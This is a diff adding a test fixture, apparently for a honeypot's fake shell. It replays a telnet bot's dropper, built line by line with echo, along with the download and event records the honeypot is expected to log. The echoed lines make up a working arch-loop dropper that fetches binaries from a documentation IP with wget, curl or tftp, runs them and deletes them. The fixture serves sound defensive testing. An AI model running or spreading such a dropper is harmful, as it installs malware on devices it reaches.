@@ -1,0 +1,32 @@
+# A dropper written line by line with echo and then run, the way a telnet bot sent it on 2026-10-08
+# (host replaced with a documentation address). Writing the script fetches nothing: the download
+# events belong to the line that runs it and name the URL the loop expanded, not the `$a` the
+# script text carries. The fake wget succeeds and `./.c` runs, so the loop's `&& break` ends it
+# after the first architecture, as it does for a bot whose first binary runs.
+# source: synthetic reproduction of an echo-assembled arch-loop dropper seen 2026-10-08
+# date: 2026-10-08
+# protocol: telnet
+# persona: ubuntu
+$ echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s
+@downloads
+@events 1
+$ echo 'wget -q http://198.51.100.9/$a -O .c||curl -s http://198.51.100.9/$a -o .c||tftp -g -l .c -r $a 198.51.100.9||tftp -g -l $a 198.51.100.9' >> .s
+@downloads
+@events 1
+$ echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s
+@downloads
+@events 1
+$ echo 'rm -f .c $a' >> .s
+@downloads
+@events 1
+$ echo 'done' >> .s
+@downloads
+@events 1
+$ sh .s; rm -f .s
+@downloads http://198.51.100.9/mips
+@events 2
+$ ls .c .s
+> ls: cannot access '.s': No such file or directory
+> .c
+@downloads
+@events 1
